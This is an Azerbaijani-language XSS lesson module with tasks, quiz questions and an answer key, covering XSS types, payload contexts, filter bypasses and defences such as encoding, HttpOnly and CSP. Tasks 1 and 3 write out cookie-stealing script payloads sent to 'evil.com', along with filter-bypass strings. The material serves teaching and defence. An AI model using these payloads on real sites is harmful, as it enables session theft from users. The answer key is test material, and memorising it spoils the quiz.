# Room: Cross-Site Scripting (XSS)

**Path:** Web Application Hacking
**Module:** OWASP Top 10
**Çətinlik:** Easy
**Təxmini vaxt:** 2 saat

## Room haqqında

XSS — istifadəçi input-unun səhifəyə "kod kimi" qayıtdığı zəiflikdir: attacker öz JavaScript-ini qurbanın browser-ində icra etdirir. Bu room-da Stored, Reflected və DOM-based XSS-in fərqlərini, sadə payload nümunələrini (izah səviyyəsində), input sanitization-in niyə kritik olduğunu və qorunma təbəqələrini öyrənəcəksiniz. SQLi server-in "qulağından" danışırdısa, XSS qurbanın "gözlərindən" danışır.

## Öyrənmə nəticələri

- XSS-in işləmə prinsipini (input-un HTML/JS kontekstinə çıxması) izah etmək
- Stored, Reflected və DOM-based növlərini ayırd etmək
- Sadə payload strukturlarını və session oğurluğu ssenarisini konseptual bilmək
- Output encoding, sanitization və CSP-nin müdafiə rollarını izah etmək

## Task 1 — XSS Nədir: Input-un Koda Çevrilməsi

XSS (Cross-Site Scripting) — tətbiq istifadəçi input-unu səhifəyə yerləşdirəndə onu düzgün encode etmirsə, input HTML/JavaScript kimi icra olunur. "Cross-site" adı tarixidən gəlir: başqa saytın kodu sizin saytın səhifəsində işə düşür.

Zəif kod nümunəsi (PHP):

```php
echo "<h1>Axtarış: " . $_GET['q'] . "</h1>";
```

İstifadəçi `?q=telefon` göndərirsə — səhifədə "Axtarış: telefon" görünür. Amma attacker bu URL-i göndərirsə:

```
?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

Yaranan səhifədə `<script>` tag-i real tag kimi parse olunur və JavaScript icra edilir — qurbanın cookie-ləri attacker serverinə gedir. Input data deyil, kod oldu.

XSS-in gücü nədir? Browser-də icra olunan JavaScript, həmin səhifənin/qurbanın imkanlarına malikdir:

- Cookie/token oğurluğu (session hijacking)
- Səhifə məzmununun dəyişdirilməsi (phishing üçün saxta login formu)
- Klaviatura dinləməsi (keylogger)
- İstifadəçi adına əməliyyatlar (klikləmə, sorğu göndərmə)
- `Same Origin Policy` sayəsində yalnız həmin origin-də — amma bu, həmin sayt üçün "istifadəçinin özü" qədər genişdir.

Aşkarlama testi — ənənəvi "canary" payload:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

`alert(1)` görünsə — input-un icra olundğu kontekst tapılıb (zəiflik sübutu). `alert(document.domain)` isə hansı origin-də icra olundğunu göstərir.

XSS SQLi-dən bir əsas fərqlə ayrılır: **hədəf server yox, istifadəçidir.** Server "yalnız" qapı açır (input-u encode etməyərək), əsl ziyan qurbanın browser-ində baş verir. Buna görə zəifliyin istismarı sosial komponent daşıyır: qurbanı zəhərli linkə/profile vurmaq lazımdır — stored XSS istisnadır, orada qurban özü gəlir.

### Sual 1

XSS-in əmələ gəlmə mexanizmini bir cümlədə izah edin.

### Sual 2

XSS ilə attacker qurbanın browser-ində hansı imkanlar əldə edir (üç nümunə)?

### Sual 3

XSS-in hədəfi SQLi-dən nə ilə fərqlənir?

## Task 2 — Üç Növ: Stored, Reflected, DOM-Based

**Stored XSS (persistent)** — zəhərli input server-də (DB-də) saxlanılır və hər baxışda bütün istifadəçilərə qayıdır. Klassik yerlər: comment-lər, profil adları, forum mesajları, chat. Nümunə: comment sahəsinə `<img src=x onerror=alert(document.cookie)>` yazılır; admin comment-ləri görəndə onun sessiyası oğurlanır. Ən təhlükəli növüdür — qurbanı tapmaq lazım deyil, qurban özü gəlir, və birdən çox qurban olur. Admin panelə çatmağın məşhur yoludur.

**Reflected XSS** — zəhərli input sorğunun özündə gəlir (URL parametri) və cavabda birbaşa əks olunur. Axtarış nəticəsi səhifəsi klassik nümunədir: `search.php?q=<script>...` — amma bunun işləməsi üçün **qurbanın bu linki açması** lazımdır. Yayılma yolları: email/link, saxta qısa URL, third-party sayt. "Reflected" adı da buradandır — server input-u sadəcə "əks etdirir", saxlamır.

**DOM-based XSS** — server-i tamamilə əhatə etmir. Zəiflik client-side JavaScript-in özündədir: skript `location.hash`-i oxuyub onu `innerHTML`-ə yazır və s. Nümunə:

```javascript
document.getElementById('info').innerHTML = location.hash.substring(1);
```

`page#<img src=x onerror=alert(1)>` — hash hissəsi DOM-a yazılır, payload işə düşür. Vacib fərq: zəhərli hissə **heç vaxt serverə getmir** — buraxılma WAF üçün görünməz ola bilər (server heç nə "görmür"). Aşkarlama üçün JS kodunu oxumaq və `innerHTML`, `document.write`, `eval`, `location` kimi "sink"-ləri izləmək lazımdır.

Müqayisə cədvəli:

| Növ | Harada saxlanır | Qurban necə çatır | Təsir radiusu |
|---|---|---|---|
| Stored | Server/DB-də | Səhifəni açan hər kəs | Bütün baxanlar (admin daxil) |
| Reflected | Yox (URL-də) | Zəhərli linki açır | Linki açanlar |
| DOM-based | Yox (URL/davranış) | Zəhərli link/fragment | Linki açanlar; WAF-evident deyil |

Aşkarlama fərqləri də növə bağlıdır: stored — hər hansı input sahəsinə canary yazıb səhifəni yenidən açmaq; reflected — parametrləri canary ilə sınayıb cavabı Burp-da oxumaq (payload cavabda "xam" görünürmü?); DOM-based — JS source analizi + browser-da sınaq (cavabda görünməsə də DOM-da görünə bilər).

### Sual 1

Stored XSS niyə ən təhlükəli növ sayılır?

### Sual 2

Reflected XSS-in işləməsi üçün əlavə nə lazımdır?

### Sual 3

DOM-based XSS server-i niyə "görmür" və bunun nəticəsi nədir?

## Task 3 — Payload-lar və Kontekst: Niyə Sadə alert Yetmir

Payload — zəifliyi istismar edən kod parçasıdır. İlk öyrənilən `alert(1)` yalnız zəifliyin sübutudur (PoC); real istismar payload-ları məqsədə yönlüdür:

- **Cookie oğurluğu:** `<script>fetch('https://evil.com/x?c='+document.cookie)</script>` — HttpOnly yoxdursa sessiya oğurlanır.
- **Saxta login:** DOM-a saxta login formu əlavə olunur, credential-lar attacker-ə gedir.
- **Keylogger:** input-ları dinləyib xaricə ötürən skript.
- **Browser exploitation:** köhnə browser-lərdə daha dərin istismarlar (bu curriculum-un sahəsi deyil).

Amma əsas bacarıq payload əzbərləmək deyil — **konteksti oxumaqdır.** Payload-ın işləməsi input-un hansı kontekstə düşdüyündən asılıdır:

1. **HTML body konteksti:** `<b>INPUT</b>` — tag yaratmaq işləyir: `<img src=x onerror=...>`.
2. **Attribute konteksti:** `<input value="INPUT">` — əvvəlcə `"` ilə attribute-u bağlamaq lazımdır: `"><script>...`.
3. **JavaScript string konteksti:** `var x = 'INPUT';` — `'` ilə string-i bağla, `;` ilə ifi bitir: `';alert(1);//`.
4. **URL konteksti:** `<a href="INPUT">` — `javascript:alert(1)` protokolu.

Hər kontekst öz "çıxış" sintaksisini tələb edir. Buna görə də peşəkar yanaşma: əvvəl input-un cavabda **harada** əks olunduğunu tap (Burp-da cavabı oxu), sonra həmin kontekstə uyğun payload qur.

Filtrlər və bypass-lar (lab səviyyəsində bilinəli): `<script>` bloklanırsa — event handler-lər (`onerror`, `onload`); hər ikisi bloklanırsa — `<svg>`, `<body>` tag-ləri; dırnaqlar filtrlənirsə — backtick və ya encoded variantlar; `alert` sözü bloklanırsa — `confirm`, `prompt`. Mövcud tag-lərdə tərkibi dəyişdirmək: `<scr<script>ipt>` (filtrin özünü aldatma). Bu "pişik-siçan" oyunu lab-larda öyrədilir; real sistemdə isə düzgün müdafiə (encoding) bütün bunları mənasızlaşdırır.

Etik qeyd: real pentest-də `alert(1)` və ya zəifliyi sübut edən məsum PoC kifayətdir — real istismar (cookie-ləri göndərmək, istifadəçi adına əməliyyat) yalnız yazılı razılaşma və zərurət halında, minimum səviyyədə aparılır. Hesabatda "session oğurlana bilər" sübutla (HttpOnly yoxluğu + icra sübutu) göstərilir.

### Sual 1

Real istismar payload-unun PoC payload-ından fərqi nədir?

### Sual 2.

Attribute kontekstində (`value="..."`) payload necə qurulur?

### Sual 3.

Filtrləri bypass üsullarından üçünü sadalayın.

## Task 4 — Müdafiə: Encoding, Sanitization, CSP

XSS-in müdafiəsi çoxtəbəqəlidir, amma mərkəzdə **output encoding** durur.

**Output encoding** — input-u çap edəndə onu HTML üçün "təhlükəsiz" simvollara çevirmək: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`, `&` → `&amp;`. Beləcə `<script>` mətn kimi görünür, tag kimi icra olunmur. Müasir template engine-lər (Jinja2, React JSX, Twig) default encoding edir — zəiflik əsasən `|safe`, `dangerouslySetInnerHTML` kimi "escape-i söndürən" yerlərdə qalır.

Vacib incəlik — **kontekstə uyğun encoding:** HTML body-də HTML encoding, attribute-da attribute encoding, JS string-də JS encoding, URL-də URL encoding. Səhv kontekst üçün düzgün encoding də işləmir.

**Sanitization** — HTML-a icazə vermək lazım olanda (rich text editor kimi) input-un "təmizlənməsi": icazəli tag-lər saxlanılır (`<b>`, `<i>`), təhlükəlilər silinir (`<script>`, `on*` atributları). Bu, çətin məsələdir və öz əlinizlə regex yazmaq tövsiyə olunmur — yetkin kitabxanalar (DOMPurify kimi) istifadə edilməlidir. Tarixən öz-başına sanitize funksiyaları çox bypass yeyib.

**Digər təbəqələr:**

- **Cookie protection:** `HttpOnly` — JavaScript-in cookie-ni oxumasını qadağan edir; XSS olsa belə sessiya oğurlanmır (amma digər ziyanlar qalır).
- **CSP (Content-Security-Policy):** səhifənin hansı mənbədən skript yükləyə/icra edə biləcəyini məhdudlaşdırır. `script-src 'self'` — yalnız öz server-dən. İnce ayarlı `nonce` əsaslı CSP inline script-ləri də idarə edir. XSS baş versə belə, xarici server-ə data göndərməyi/mənbə yükləməyi çətinləşdirir (ziyanı məhdudlaşdırır, aradan qaldırmır).
- **Input validation:** məntiqə uyğun məsafələr (ad sahəsinə HTML ümumiyyətlə lazım deyil) — amma tək başına kifayət etmir, çünki encoding həmişə lazımdır.

Niyə "input-da filtr" yetərli müdafiə sayılmır? Çünki eyni input tətbiqin müxtəlif yerlərində müxtəlif kontekstlərə düşür (DB-dən oxunub 3 fərqli səhifədə göstərilə bilər). Encoding isə istifadə anında, istifadə yerinə uyğun tətbiq olunur — "encode at the point of output" prinsipi.

Bir də steriotipin qarşısı: "HTTPS varsa XSS işləməz" — yanlış; XSS tətbiq səviyyəsidir, HTTPS transport qatıdır. "React/Laravel istifadə edirik, xəbərdarlıq verir" — framework defaultları güclüdür, amma escape-i söndürən hər yer (dangerouslySetInnerHTML, {!! !!}, |raw) potensial zəif nöqtədir.

### Sual 1

Output encoding nə edir və niyə input-da yox, output-da tətbiq olunur?

### Sual 2.

HttpOnly cookie-ni XSS-dən qoruyur, amma hansı hallarda kifayət etmir?

### Sual 3.

CSP XSS-i aradan qaldırır, yoxsa ziyanını azaldır — izah edin.

## Task 5 — XSS Testi Metodologiyası

Sistematik XSS testi üç mərhələlidir:

**1. Input nöqtələrinin xəritəsi.** Bütün parametrlər: URL parametrləri, form sahələri, header-lər (User-Agent, Referer — log/admin panel-də əks olunursa), fayl adları, JSON sahələri. Unutmayın: gizli parametrlər də ola bilər (JS-dən, arxivlərdən tapılır).

**2. Canary əsaslı sınaq.** Hər nöqtəyə unikal marker (`xzq123`) göndər → cavabda markeri tap → hansı kontekstdə göründüyünü müəyyən et (body? attribute? JS string?) → həmin kontekst üçün payload qur. Bu yanaşma " filtered" nəticəsindən dəqiqdir: payload "gizlədilib"sə, marker göstərir ki, input haradadır və nə ilə kəsilir.

**3. İstismar ssenarisi sübutu.** Zəiflik tapılanda real təsiri göstər: cookie-nin oxuna biləcəyi (`document.cookie` nəticəsi), HttpOnly-nin olmaması, saxta formanın yerləşdirilməsi (ekran görüntüsü). Stored XSS-də admin axınını simulyasiya etmək üçün öz test admin hesabınızdan baxın.

Praktik mühitlər: öz lab-ınızda DVWA/XSS challenge-ləri, PortSwigger Web Security Academy (XSS seriyası ən sistemlidir), TryHackMe XSS room-ları. Hər növü (stored/reflected/DOM) ən azı bir dəfə əl ilə həll etmək — payload "resepti" deyil, kontekst oxuma vərdiyşi formalaşdırır.

Yekun dünya görüşü bu room üçün: **XSS — "güvən sərhədinin" (browser-in səhifəyə etibarının) istismarıdır.** Server hər istifadəçiyə eyni səhifəni göndərir; həmin səhifədə başqa istifadəçinin kodu icra olunursa, bütün "eyni origin" imkanları onun ixtiyarına keçir. Müdafiənin məqsədi sadədir: **input heç vaxt kod kimi qayıtmamalıdır** — encoding bunu təmin edir.

### Sual 1

Canary marker (`xzq123`) metodunun üstünlüyü nədir?

### Sual 2.

User-Agent header-i XSS nöqtəsi ola bilərmi — nə vaxt?

### Sual 3.

Stored XSS testində "admin axını" nəyə lazımdır?

## Yekun Yoxlama (Summary Quiz)

1. XSS-in işləmə prinsipini və SQLi-dən fərqini izah edin.
2. Stored, Reflected və DOM-based XSS-i müqayisə edin (saxlanma, çatma yolu, radius).
3. Kontekst anlayışı nədir və attribute kontekstində payload necə qurulur?
4. Output encoding, HttpOnly və CSP-nin müdafiə rollarını ayırd edin.
5. "Encode at the point of output" prinsipini izah edin.

---

## CƏVAB AÇARI (yalnız content creator üçün — istifadəçiyə göstərilməməlidir)

**Task 1 sualları:**
1. Tətbiq istifadəçi input-unu encode etmədən HTML/JavaScript kontekstinə (səhifəyə) qaytarır — input data deyil, kod kimi icra olunur.
2. Cookie/token oğurluğu; DOM dəyişməsi (saxta login/phishing); klaviatura dinləməsi; istifadəçi adına sorğu/əməliyyatlar.
3. SQLi hədəfi server (DB-yə çıxış), XSS hədəfi qurbanın browser-i — server yalnız qapını açır; ziyan istifadəçi tərəfdə baş verir.

**Task 2 sualları:**
1. Zəhərli kod server-də saxlanır və səhifəni açan hər kəsə (admin daxil) təsir edir — qurban axtarmaq sosial mühəndislik tələb etmir, birdən çox qurban olur.
2. Qurbanın zəhərli linki açması (email, saxta URL, digər sayt vasitəsilə yönləndirmə) — input URL-də gəlir, server-də saxlanmır.
3. Zəhərli hissə (məs. location.hash) heç vaxt server-ə göndərilmir — zəiflik tamamilə client-side JS-dədir; nəticə: server tərəfli WAF onu görə bilmir, JS kod analizi tələb olunur.

**Task 3 sualları:**
1. PoC (alert) yalnız zəifliyi sübut edir; istismar payload-u konkret məqsədlidir (cookie oğurluğu, saxta forma, keylogger).
2. Əvvəlcə attribute-u bağlamaq lazımdır: `"><img src=x onerror=...>` — birinci `"` value attribute-unu bağlayır, sonra yeni tag başlayır.
3. Event handler-lər (onerror/onload), alternativ tag-lər (svg/body), söz filtrlərini çaşdırma (scr<script>ipt, alert yerinə confirm/prompt), encoding variantları.

**Task 4 sualları:**
1. Xüsusi simvolları HTML entity-lərinə çevirir (`<` → `&lt;`) — kod icra olunmur, mətn görünür. Output-da, çünki eyni input müxtəlif yerlərdə müxtəlif kontekstlərə düşür və encoding istifadə anında kontekstə uyğun olmalıdır.
2. Digər ziyanları dayandırmır: DOM dəyişməsi, saxta login, keylogger, token-lərin localStorage-dan oxunması; həmçinin token header-də gedirsə HttpOnly kömək etmir.
3. Ziyanı azaldır/məhdudlaşdırır: xarici mənbələrdən skript yükləməni və data ötürməni çətinləşdirir, amma encoding kimi zəifliyin kökünü qaldırmır.

**Task 5 sualları:**
1. Filtirlənib-filtirlənmədiyindən asılı olmayaraq input-un cavabda harada və hansı kontekstdə göründüyünü dəqiq göstərir — payload-u həmin kontekstə uyğun qurmağa imkan verir.
2. Bəli — header dəyəri admin panel/log səhifəsində əks olunursa (məs. access log viewer) orada icra oluna bilər.
3. Təsir sübutu üçün: stored payload admin tərəfindən açılanda sessiya/cookie oğurlanacağını öz test admin hesabı ilə təsdiqləmək.

**Yekun Quiz:**
1. Input-un encode edilmədən səhifəyə qayıdması və qurbanın browser-ində kod kimi icrası; fərq: SQLi server-in/DB-nin istismarı, XSS istifadəçi/browser-in istismarıdır.
2. Stored — DB-də saxlanır, hər baxan üçün; Reflected — URL-də, linki açan üçün; DOM-based — client JS-də, server-i əhatə etmir, WAF-görünməz.
3. Input-un düşdüyü yer (body/attribute/JS/URL); attribute-da: `">` ilə bağlayıb yeni tag/event handler başladılır.
4. Encoding — input-un kod kimi icrasını kəsir (kök həll); HttpOnly — cookie-nin JS-dən oxunmasını (ancaq bir ziyan vectorunu); CSP — skript mənbələrini məhdudlaşdırır (ziyanın miqyasını azaldır).
5. Encoding istifadə anında, istifadə olunan kontekstə uyğun tətbiq olunmalıdır — çünki eyni data müxtəlif çıxış nöqtələrində müxtəlif kontekstlər tələb edir.
